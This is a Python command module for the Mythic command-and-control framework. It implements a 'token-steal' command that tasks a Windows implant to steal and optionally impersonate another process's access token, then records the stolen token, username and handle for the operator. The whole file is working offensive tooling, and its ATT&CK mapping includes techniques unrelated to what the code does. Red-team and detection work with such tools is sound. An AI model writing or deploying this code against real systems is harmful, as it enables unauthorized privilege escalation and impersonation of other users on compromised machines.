from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .Utils.u import *

class TokenStealArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="pid",
                type=ParameterType.Number,
                description="Process ID to steal token from",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="use",
                cli_name="use",
                type=ParameterType.Boolean,
                default_value=True,
                description="Automatically use the stolen token",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                try:
                    parts = self.command_line.split()
                    if len(parts) >= 2 and parts[0] == "-pid":
                        self.add_arg("pid", int(parts[1]))
                        if len(parts) >= 4 and parts[2] == "-use":
                            self.add_arg("use", parts[3].lower() in ("true", "1", "yes"))
                except Exception as e:
                    raise ValueError(f"Failed to parse command line: {str(e)}")

class TokenStealCommand(CommandBase):
    cmd = "token-steal"
    needs_admin = False
    help_cmd = "token-steal -pid <PID> [-use <true|false>]"
    description = "Steal an access token from a specified process and optionally use it"
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1070", "T1485", "T1134"]
    argument_class = TokenStealArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            DisplayParams=f"-pid {task.args.get_arg('pid')} -use {task.args.get_arg('use')}",
            CommandName="token"
        )
        
        task.args.add_arg("action", "steal")
        
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        try:
            if not response:
                return PTTaskProcessResponseMessageResponse(
                    TaskID=task.Task.ID,
                    Success=True,
                    Completed=True
                )
            
            # Parse the binary response
            raw_response = bytes.fromhex(response)
            psr = Parser(raw_response, len(raw_response))
            
            success = psr.Int32()
            token_id = psr.Int32()
            proc_id = psr.Int32()
            username = psr.Str()
            hostname = psr.Str()
            handle = psr.Int64()

            # Create token in Mythic
            token_message =  f"Stolen token from PID {proc_id}\n"
            token_message += f"Username: {username}\n"
            token_message += f"Hostname: {hostname}\n"
            token_message += f"Token Handle: 0x{handle:x}\n"
            
            token_list = Token( 
                TokenID=token_id, 
                User=username, 
                Handle=handle, 
                ProcessID=proc_id 
            )

            await SendMythicRPCTokenCreate(MythicRPCTokenCreateMessage(
                TaskID=task.Task.ID,
                Tokens=token_list
            ))
            
            # Send detailed response to operator
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=token_message.encode('utf-8')
            ))

            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=bool(success),
                Completed=True
            )

        except Exception as e:
            error_msg = f"Error processing token steal response: {str(e)}"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=error_msg.encode('utf-8')
            ))
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=False,
                Error=error_msg,
                Completed=True
            )